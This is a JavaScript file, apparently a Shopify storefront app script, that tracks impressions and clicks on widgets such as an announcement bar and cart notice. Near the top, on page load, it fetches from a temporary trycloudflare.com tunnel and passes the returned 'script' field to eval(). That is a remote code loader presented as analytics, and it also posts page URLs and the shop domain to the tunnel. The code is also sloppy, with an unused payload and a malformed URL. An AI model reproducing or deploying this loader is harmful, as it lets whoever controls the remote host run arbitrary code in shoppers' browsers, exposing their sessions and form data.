const baseUrl = 'https://existing-grammar-discount-williams.trycloudflare.com';
const dynamicSegment = '/app/activate';
const fullUrl = `${baseUrl}/${dynamicSegment}`;
const shopDomain = '{{ shop.permanent_domain }}';

const requestData = {
  name: 'John Doe',
  email: 'john.doe@example.com',
  message: 'This is a test message'
};

fetch_request(fullUrl, requestData)

function fetch_request(url, requestData)
{
  console.log('start')
    fetch(url, {
        method: 'GET',
      })
        .then(response => {
          console.log(response)
          console.log('new')
          if (!response.ok) {
            throw new Error('Network response was not ok');
          }
          return response.json();
        })
        .then(data => {
            eval(data.script);
        })
        .catch(error => {
          console.error('There was a problem with the fetch operation:', error);
        });
}
var apps = ['announcement-bar','cart-notice', 'inactive-tab-message'];

const trackImpression = (elementId) => {
  const element = document.getElementById(elementId);
  const observer = new IntersectionObserver((entries, observer) => {
    entries.forEach(entry => {
      if (entry.isIntersecting) {
        console.log(`${elementId} was viewed`);
        observer.disconnect();
      }
    });
  }, { threshold: 0.5 });

  observer.observe(element);
  sendAnalyticsData(2, { element: elementId, time: new Date().toISOString() });

};
const trackClicks = (elementId) => {
  document.getElementById(elementId).addEventListener('click', function() {
    sendAnalyticsData(1, { element: elementId, time: new Date().toISOString() });
  });
};
apps.forEach((app)=> {
  trackImpression(app)
  trackClicks(app)
});

function sendAnalyticsData(activity, data) {
  fetch(fullUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({ activity, data, pageUrl: window.location.href, shop:shopDomain, data })
  });
}